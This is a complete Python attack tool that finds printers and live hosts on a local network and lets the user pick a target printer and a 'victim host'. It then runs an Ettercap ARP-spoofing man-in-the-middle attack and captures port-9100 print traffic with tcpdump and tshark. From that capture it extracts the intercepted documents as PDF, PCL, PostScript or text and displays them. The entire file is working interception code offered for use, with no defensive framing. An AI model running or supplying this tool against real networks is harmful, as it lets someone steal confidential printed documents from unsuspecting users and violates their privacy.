#!/usr/bin/env python3
import ipaddress
import subprocess
import tempfile
import signal
import os
import sys
import re
import time
import glob
import binascii
import threading

temp_file = None
ettercap_process = None
capture_file = None
interface = None

ORANGE = "\033[33m"
GREEN = "\033[32m"
BLUE = "\033[34m"
RED = "\033[31m"
RESET = "\033[0m"

def validate_network_input(network):
    try:
        ipaddress.ip_network(network)
        return True
    except ValueError:
        return False


def list_network_interfaces():
    try:
        result = subprocess.check_output(["ip", "link", "show"], stderr=subprocess.DEVNULL).decode()
        interfaces = re.findall(r'\d+: ([^:]+):', result)
        return [iface for iface in interfaces if iface != 'lo']
    except:
        return []


def get_interface_network(interface):
    try:
        if not os.path.exists(f"/sys/class/net/{interface}"):
            print(f"{RED}[!] Interface {interface} does not exist{RESET}")
            return None

        ip_info = subprocess.check_output(["ip", "addr", "show", interface], stderr=subprocess.DEVNULL).decode()
        if "state DOWN" in ip_info:
            print(f"{RED}[!] Interface {interface} is inactive{RESET}")
            return None

        ip_match = re.search(r'inet (\d+\.\d+\.\d+\.\d+)/(\d+)', ip_info)
        if not ip_match:
            print(f"{RED}[!] Interface {interface} has no IP address{RESET}")
            return None

        ip = ip_match.group(1)
        prefix = ip_match.group(2)
        
        try:
            network = ipaddress.ip_network(f"{ip}/{prefix}", strict=False)
            return str(network)
        except ValueError as e:
            print(f"{RED}[!] Error converting IP address: {str(e)}{RESET}")
            return None

    except subprocess.CalledProcessError as e:
        print(f"{RED}[!] Error executing ip command: {str(e)}{RESET}")
        return None
    except Exception as e:
        print(f"{RED}[!] Unexpected error: {str(e)}{RESET}")
        return None


def scan_for_printers(network):
    print(f"{GREEN}[+] ...Scanning network {network} for printers...{RESET}")
    with tempfile.NamedTemporaryFile(delete=False, mode='w+') as tmp:
        global temp_file
        temp_file = tmp.name
        subprocess.run([
            "nmap", "-p", "9100,631", "--open", "-oG", temp_file, network
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        printers = []
        with open(temp_file, 'r') as f:
            for line in f:
                if "Ports" in line and ("9100/open" in line or "631/open" in line):
                    match = re.search(r'Host: (\d+\.\d+\.\d+\.\d+)', line)
                    if match and match.group(1) not in printers:
                        printers.append(match.group(1))
        return printers


def detect_printer_details(ip):
    details = {"ip": ip, "banner": None, "snmp": None}
    try:
        banner = subprocess.check_output(
            ["timeout", "3", "nc", "-w", "3", ip, "9100"], stderr=subprocess.DEVNULL, input=b"\n"
        ).decode("utf-8", errors="ignore").strip()
        if banner:
            details["banner"] = banner
    except:
        details["banner"] = None
    try:
        snmp_data = subprocess.check_output(
            ["snmpget", "-v2c", "-c", "public", ip, "1.3.6.1.2.1.1.1.0"], stderr=subprocess.DEVNULL
        ).decode("utf-8", errors="ignore").strip()
        match = re.search(r'STRING: (.+)', snmp_data)
        if match:
            details["snmp"] = match.group(1)
    except:
        details["snmp"] = None
    return details


def start_ettercap(victim_ip, printer_ip):
    global ettercap_process, capture_file, interface
    print(f"{GREEN}[+] Lancement de l'attaque MITM entre l'imprimante {printer_ip} et le client {victim_ip} :{RESET}")
    capture_file = f"capture_{printer_ip}.pcap"
    ettercap_cmd = [
        "sudo", "ettercap", "-T", "-q", "-i", interface, "-M", "arp:remote",
        f"/{victim_ip}//", f"/{printer_ip}//", "-w", capture_file
    ]

    ettercap_process = subprocess.Popen(ettercap_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    time.sleep(2)
    return capture_file


def extract_print_job(pcap_file, output_dir="extracted_prints"):
    """Extract print jobs from pcap using tshark"""
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
    timestamp = int(time.time())
    raw_hex_file = f"/tmp/print_job_{timestamp}.hex"
    raw_bin_file = f"/tmp/print_job_{timestamp}.raw"

    with open(raw_hex_file, 'w') as f:
        subprocess.run([
            "tshark", "-r", pcap_file, "-Y", "tcp.port==9100 || tcp.port==631", "-T", "fields", "-e", "tcp.payload"
        ], stdout=f, stderr=subprocess.DEVNULL)

    with open(raw_hex_file, 'r') as f_in, open(raw_bin_file, 'wb') as f_out:
        for line in f_in:
            line = line.strip().replace(':', '')
            if line:
                try:
                    f_out.write(binascii.unhexlify(line))
                except Exception:
                    continue

    with open(raw_bin_file, 'rb') as f:
        content = f.read()

    if b'%PDF' in content:
        final_file = f"{output_dir}/print_job_{timestamp}.pdf"
        with open(final_file, 'wb') as f2:
            f2.write(content)
        return final_file
    elif b'\x1B%-12345' in content:
        final_file = f"{output_dir}/print_job_{timestamp}.pcl"
        with open(final_file, 'wb') as f2:
            f2.write(content)
        return final_file
    elif b'%!PS' in content:
        final_file = f"{output_dir}/print_job_{timestamp}.ps"
        with open(final_file, 'wb') as f2:
            f2.write(content)
        return final_file
    else:
        text_file = f"{output_dir}/print_job_{timestamp}.txt"
        try:
            encodings = ['utf-8', 'latin1', 'cp1252', 'ascii', 'iso-8859-1', 'windows-1252']
            for encoding in encodings:
                try:
                    text_content = content.decode(encoding, errors='ignore')
                    text_content = re.sub(r'[^\x20-\x7E\n\r\t]', '', text_content)
                    if len(text_content.strip()) > 0:
                        with open(text_file, 'w', encoding='utf-8') as f2:
                            f2.write(text_content)
                        return text_file
                except:
                    continue
        except Exception:
            pass
    return None


def monitor_capture_file():
    print(f"{GREEN}[+] Monitoring file: {capture_file}\nPress CTRL+C to stop...{RESET}", flush=True)
    detected_streams = set()
    try:
        while True:
            if os.path.exists(capture_file):
                try:
                    stream_ids = subprocess.check_output([
                        "tshark", "-r", capture_file, "-Y", "tcp.port==9100", "-T", "fields", "-e", "tcp.stream"
                    ], stderr=subprocess.STDOUT).decode("utf-8", errors="ignore")
                    stream_ids = set([s.strip() for s in stream_ids.splitlines() if s.strip().isdigit()])
                except Exception as e:
                    stream_ids = set()
                new_streams = stream_ids - detected_streams
                for stream_id in new_streams:
                    print(f"{BLUE}[INFO] Print stream detected (tcp.stream={stream_id}) in capture.{RESET}", flush=True)
                detected_streams |= stream_ids
            else:
                print(f"{ORANGE}[*] Waiting for capture file creation...{RESET}", flush=True)
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[INFO] Interrupt detected. Extracting prints...", flush=True)
        extract_all_print_jobs(capture_file)
        cleanup_and_exit()


def extract_all_print_jobs(pcap_file):
    try:
        stream_ids = subprocess.check_output([
            "tshark", "-r", pcap_file, "-Y", "tcp.port==9100", "-T", "fields", "-e", "tcp.stream"
        ], stderr=subprocess.STDOUT).decode("utf-8", errors="ignore")
        stream_ids = set([s.strip() for s in stream_ids.splitlines() if s.strip().isdigit()])
        for stream_id in stream_ids:
            out_file = f"extracted_prints/print_{stream_id}.txt"
            os.makedirs("extracted_prints", exist_ok=True)
            subprocess.run([
                "tshark", "-r", pcap_file, "-qz", f"follow,tcp,ascii,{stream_id}"
            ], stdout=open(out_file, "w"), stderr=subprocess.DEVNULL)
            print(f"{GREEN}[+] Print extracted: {out_file}{RESET}", flush=True)
    except Exception as e:
        print(f"[EXTRACTION ERROR] {e}", flush=True)


def cleanup_and_exit(signum=None, frame=None):
    global temp_file, ettercap_process
    print(f"\n{RED}[!] Interruption detected. Cleaning up...{RESET}", flush=True)
    if ettercap_process:
        ettercap_process.terminate()
    if temp_file and os.path.exists(temp_file):
        os.remove(temp_file)
    sys.exit(0)


signal.signal(signal.SIGINT, cleanup_and_exit)

def scan_for_hosts(network):
    print(f"{GREEN}[+] Scanning network {network} for active hosts...{RESET}")
    print(f"\n{BLUE}[+] Detected active hosts:{RESET}", flush=True)
    with tempfile.NamedTemporaryFile(delete=False, mode='w+') as tmp:
        subprocess.run([
            "nmap", "-sn", "-oG", tmp.name, network
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        hosts = []
        with open(tmp.name, 'r') as f:
            for line in f:
                if line.startswith("Host:") and "Status: Up" in line:
                    match = re.search(r'Host: (\d+\.\d+\.\d+\.\d+)', line)
                    if match and match.group(1) not in hosts:
                        hosts.append(match.group(1))
        return hosts


def live_print_monitor(interface):
    print(f"{GREEN}[+] Live monitoring on interface {interface} (port 9100)...{RESET}", flush=True)
    detected_streams = set()
    os.makedirs("extracted_prints", exist_ok=True)
    tshark_proc = subprocess.Popen([
        "tshark", "-i", interface, "-Y", "tcp.port==9100", "-T", "fields", "-e", "tcp.stream"
    ], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True, bufsize=1)
    try:
        for line in tshark_proc.stdout:
            stream_id = line.strip()
            if stream_id.isdigit() and stream_id not in detected_streams:
                print(f"{BLUE}[INFO] Print stream detected live (tcp.stream={stream_id}){RESET}", flush=True)
                out_file = f"extracted_prints/print_{stream_id}.txt"
                subprocess.run([
                    "tshark", "-i", interface, "-qz", f"follow,tcp,ascii,{stream_id}", "-Y", f"tcp.stream=={stream_id}"
                ], stdout=open(out_file, "w"), stderr=subprocess.DEVNULL)
                print(f"{GREEN}[+] Print extracted live: {out_file}{RESET}", flush=True)
                detected_streams.add(stream_id)
    except KeyboardInterrupt:
        print("\n[INFO] Stopping live monitoring.", flush=True)
        tshark_proc.terminate()
        cleanup_and_exit()


def live_mitm_and_print_monitor(interface, victim_ip, printer_ip):
    print(f"{GREEN}[+] Starting MITM with Ettercap...{RESET}", flush=True)
    ettercap_cmd = [
        "ettercap", "-T", "-q", "-i", interface, "-M", "arp:remote",
        f"/{victim_ip}//", f"/{printer_ip}//"
    ]
    ettercap_proc = subprocess.Popen(ettercap_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    capture_dir = os.path.abspath(os.path.dirname(__file__))
    capture_file = os.path.join(capture_dir, f"mitm_capture_{int(time.time())}.pcap")
    
    print(f"{GREEN}[+] MITM active. Starting capture on {interface}...{RESET}", flush=True)
    
    tcpdump_capture_cmd = [
        "tcpdump", "-i", interface, "-w", capture_file, "-s", "0", "tcp port 9100"
    ]
    capture_proc = subprocess.Popen(tcpdump_capture_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    time.sleep(1)
    
    print(f"{GREEN}[+] Waiting for print connection on port 9100...{RESET}", flush=True)
    print(f"{BLUE}[*] Press Ctrl+C to stop manually, or wait for print completion{RESET}", flush=True)
    
    try:
        tcpdump_cmd = [
            "tcpdump", "-i", interface, "-l", "tcp port 9100", "-n"
        ]
        tcpdump_proc = subprocess.Popen(tcpdump_cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True, bufsize=1)
        
        fin_detected = False
        fin_time = 0
        lines_after_fin = 0
        last_activity_time = time.time()
        connection_active = False
        bytes_transferred = 0
        syn_count = 0
        fin_count = 0
        packet_count = 0
        
        print(f"\n{BLUE}{'='*60}{RESET}")
        print(f"{BLUE}| {'Connection Status':<30} | {'Packets':<10} | {'Bytes':<12} |{RESET}")
        print(f"{BLUE}{'='*60}{RESET}")
        print(f"| {'Waiting for connection...':<30} | {0:<10} | {0:<12} |")
        
        for line in tcpdump_proc.stdout:
            packet_count += 1
            last_activity_time = time.time()
            
            length_match = re.search(r'length (\d+)', line)
            if length_match:
                bytes_transferred += int(length_match.group(1))
            
            if "9100" in line and "Flags [S]" in line:
                syn_count += 1
                if not connection_active:
                    connection_active = True
                    print(f"\r{GREEN}| {'New connection detected':<30} | {packet_count:<10} | {bytes_transferred:<12} |{RESET}")
            
            if packet_count % 5 == 0 and connection_active:
                status = "Transfer in progress..."
                print(f"\r{GREEN}| {status:<30} | {packet_count:<10} | {bytes_transferred:<12} |{RESET}", end="")
            
            if not fin_detected and "9100" in line and ("Flags [F" in line or "Flags [.F" in line or "Flags [F.]" in line or "Flags [FP]" in line):
                fin_detected = True
                fin_count += 1
                fin_time = time.time()
                print(f"\r{BLUE}| {'Connection end detected (FIN)':<30} | {packet_count:<10} | {bytes_transferred:<12} |{RESET}")
            
            if fin_detected:
                lines_after_fin += 1
                
                if "Flags [.]" in line and "ack" in line.lower():
                    print(f"\r{BLUE}| {'End confirmed (ACK received)':<30} | {packet_count:<10} | {bytes_transferred:<12} |{RESET}")
                    print(f"{BLUE}{'='*60}{RESET}")
                    time.sleep(1)
                    break
                
                if lines_after_fin > 1 and "Flags [F" in line:
                    fin_count += 1
                    print(f"\r{BLUE}| {'End confirmed (FIN-FIN)':<30} | {packet_count:<10} | {bytes_transferred:<12} |{RESET}")
                    print(f"{BLUE}{'='*60}{RESET}")
                    time.sleep(1)
                    break
                
                if lines_after_fin >= 3 or (time.time() - fin_time > 2):
                    print(f"\r{BLUE}| {'End confirmed (timeout)':<30} | {packet_count:<10} | {bytes_transferred:<12} |{RESET}")
                    print(f"{BLUE}{'='*60}{RESET}")
                    break
            
            if connection_active and time.time() - last_activity_time > 5:
                print(f"\r{BLUE}| {'End by inactivity':<30} | {packet_count:<10} | {bytes_transferred:<12} |{RESET}")
                print(f"{BLUE}{'='*60}{RESET}")
                break
        
        print(f"\n{GREEN}[+] Print stream completed! {packet_count} packets, {bytes_transferred} bytes captured{RESET}", flush=True)
        
        time.sleep(2)
        
        print(f"{BLUE}[*] Stopping capture processes...{RESET}", flush=True)
        tcpdump_proc.terminate()
        tcpdump_proc.wait()
        
        capture_proc.terminate()
        capture_proc.wait()
        
        time.sleep(1)
        
        if not os.path.exists(capture_file):
            print(f"{RED}[!] Capture file {capture_file} was not created{RESET}", flush=True)
            with open(capture_file, 'wb') as f:
                pass
        else:
            try:
                os.chmod(capture_file, 0o666)
                print(f"{GREEN}[+] Capture file created: {capture_file} ({os.path.getsize(capture_file)} bytes){RESET}", flush=True)
            except Exception as e:
                print(f"{ORANGE}[*] Error changing permissions: {str(e)}{RESET}", flush=True)
        
        time.sleep(1)
        
        analyze_capture(capture_file)
        
        print(f"{BLUE}[*] Stopping Ettercap...{RESET}", flush=True)
        ettercap_proc.terminate()
        ettercap_proc.wait()
        
        cleanup_and_exit()
    
    except KeyboardInterrupt:
        print(f"\n{GREEN}[+] Manual capture stop...{RESET}", flush=True)
        
        tcpdump_proc.terminate()
        tcpdump_proc.wait()
        
        capture_proc.terminate()
        capture_proc.wait()
        
        time.sleep(1)
        
        if not os.path.exists(capture_file):
            print(f"{RED}[!] Capture file {capture_file} was not created{RESET}", flush=True)
            with open(capture_file, 'wb') as f:
                pass
        else:
            try:
                os.chmod(capture_file, 0o666)
            except Exception as e:
                print(f"{ORANGE}[*] Error changing permissions: {str(e)}{RESET}", flush=True)
        
        time.sleep(1)
        
        analyze_capture(capture_file)
        
        ettercap_proc.terminate()
        ettercap_proc.wait()
        
        cleanup_and_exit()

def analyze_capture(capture_file):
    """Analyze a completed pcap capture to extract print streams"""
    print(f"{GREEN}[+] Analyzing capture {capture_file}...{RESET}", flush=True)
    
    if not os.path.exists(capture_file):
        print(f"{RED}[!] Capture file {capture_file} not found{RESET}", flush=True)
        return
    
    if os.path.getsize(capture_file) == 0:
        print(f"{RED}[!] Empty capture file{RESET}", flush=True)
        return
    
    os.makedirs("extracted_prints", exist_ok=True)
    
    try:
        print(f"{BLUE}[*] Extracting content with tcpdump...{RESET}", flush=True)
        temp_file = f"/tmp/print_raw_{int(time.time())}.txt"
        out_file = f"extracted_prints/print_{int(time.time())}.txt"
        
        with open(temp_file, 'w') as f:
            subprocess.run([
                "tcpdump", "-A", "-r", capture_file, "tcp port 9100"
            ], stdout=f, stderr=subprocess.DEVNULL)
        
        print(f"{BLUE}[*] Cleaning and extracting print content...{RESET}", flush=True)
        
        with open(temp_file, 'r', errors='ignore') as f:
            content = f.read()
        
        clean_content = ""
        packet_lines = content.split('\n')
        
        skip_next = False
        buffer = []
        
        for line in packet_lines:
            if re.match(r'\d{2}:\d{2}:\d{2}\.\d+ IP', line) or line.startswith('E..'):
                skip_next = False
                continue
            
            if skip_next:
                skip_next = False
                continue
            
            if line.strip():
                buffer.append(line)
        
        content_lines = []
        for line in buffer:
            line = line.strip()
            if line and line not in content_lines:
                content_lines.append(line)
        
        clean_content = "\n".join(content_lines)
        
        with open(out_file, 'w', encoding='utf-8') as f:
            f.write(clean_content)
        
        try:
            os.chmod(out_file, 0o666)
        except Exception as e:
            print(f"{ORANGE}[*] Error changing permissions: {str(e)}{RESET}", flush=True)
        
        try:
            size = os.path.getsize(out_file)
            if size > 0:
                print(f"\n{GREEN}{'='*60}{RESET}")
                print(f"{GREEN}| INTERCEPTED PRINT CONTENT:{RESET}")
                print(f"{GREEN}{'='*60}{RESET}")
                
                with open(out_file, 'r', errors='ignore') as f:
                    content = f.read()
                    print(f"{content}")
                    
                print(f"{GREEN}{'='*60}{RESET}")
                print(f"{GREEN}[+] Content extracted and saved to: {out_file} ({size} bytes){RESET}", flush=True)
            else:
                print(f"{ORANGE}[*] Extracted file appears to be empty{RESET}", flush=True)

        except Exception as e:
            print(f"{RED}[!] Error reading extracted file: {str(e)}{RESET}", flush=True)
        
        try:
            os.remove(temp_file)
        except:
            pass
    
    except Exception as e:
        print(f"{RED}[!] Error during analysis: {str(e)}{RESET}", flush=True)

def main():
    global interface
    try:
        interfaces = list_network_interfaces()
        if not interfaces:
            print(f"{RED}[!] No network interfaces found{RESET}", flush=True)
            sys.exit(1)
        print(f"\n{GREEN}[+] Available interfaces:{RESET}", flush=True)
        for idx, iface in enumerate(interfaces):
            print(f"  {idx + 1}. {iface}", flush=True)
        try:
            choice = input(f"\n{ORANGE}[?] Select the interface number to use: {RESET}").strip()
            if not choice.isdigit() or int(choice) < 1 or int(choice) > len(interfaces):
                print(f"{RED}[!] Invalid choice{RESET}", flush=True)
                sys.exit(1)
            interface = interfaces[int(choice) - 1]
        except KeyboardInterrupt:
            print(f"\n{RED}[!] Interruption detected. Exiting...{RESET}", flush=True)
            sys.exit(0)

        interface_network = get_interface_network(interface)
        if not interface_network:
            print(f"{RED}[!] Could not get network information from {interface}{RESET}", flush=True)
            sys.exit(1)
        print(f"{GREEN}[+] Interface {interface} is on network {interface_network}{RESET}", flush=True)

        printers = scan_for_printers(interface_network)
        if not printers:
            print(f"{RED}[!] No printers detected{RESET}", flush=True)
            sys.exit(1)
        print(f"\n{BLUE}[+] Detected printers:{RESET}", flush=True)
        for idx, ip in enumerate(printers):
            info = detect_printer_details(ip)
            print(f"  {idx + 1}. {ip}", flush=True)
            if info["snmp"]:
                print(f"     SNMP   : {info['snmp']}", flush=True)
        try:
            printer_choice = input(f"\n{ORANGE}[?] Select the number of the printer to target: {RESET}").strip()
            if not printer_choice.isdigit() or int(printer_choice) < 1 or int(printer_choice) > len(printers):
                print(f"{RED}[!] Invalid printer choice{RESET}", flush=True)
                sys.exit(1)
            printer_ip = printers[int(printer_choice) - 1]
        except KeyboardInterrupt:
            print(f"\n{RED}[!] Interruption detected. Exiting...{RESET}", flush=True)
            sys.exit(0)

        victims = scan_for_hosts(interface_network)
        if not victims:
            print(f"{RED}[!] No active hosts found{RESET}", flush=True)
            sys.exit(1)
        for idx, ip in enumerate(victims):
            print(f"  {idx + 1}. {ip}", flush=True)
        try:
            victim_choice = input(f"\n{ORANGE}[?] Select the number of the victim host: {RESET}").strip()
            if not victim_choice.isdigit() or int(victim_choice) < 1 or int(victim_choice) > len(victims):
                print(f"{RED}[!] Invalid victim choice{RESET}", flush=True)
                sys.exit(1)
            victim_ip = victims[int(victim_choice) - 1]
        except KeyboardInterrupt:
            print(f"\n{RED}[!] Interruption detected. Exiting...{RESET}", flush=True)
            sys.exit(0)

        live_mitm_and_print_monitor(interface, victim_ip, printer_ip)
        return

    except KeyboardInterrupt:
        cleanup_and_exit()

if __name__ == "__main__":
    main()
